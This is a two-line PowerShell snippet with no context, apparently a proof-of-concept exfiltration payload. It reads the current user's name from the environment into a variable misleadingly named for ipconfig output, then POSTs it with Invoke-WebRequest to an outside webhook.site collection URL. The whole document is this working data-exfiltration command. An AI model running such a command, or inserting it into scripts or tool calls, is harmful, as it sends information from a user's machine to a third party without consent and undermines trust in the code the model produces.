$ipconfigOutput = "You are logged in as $env:USERNAME" | Out-String ;; Invoke-WebRequest -Uri https://webhook.site/0592162d-7347-4826-9480-9b3988be7336 -Method POST -Body $ipconfigOutput
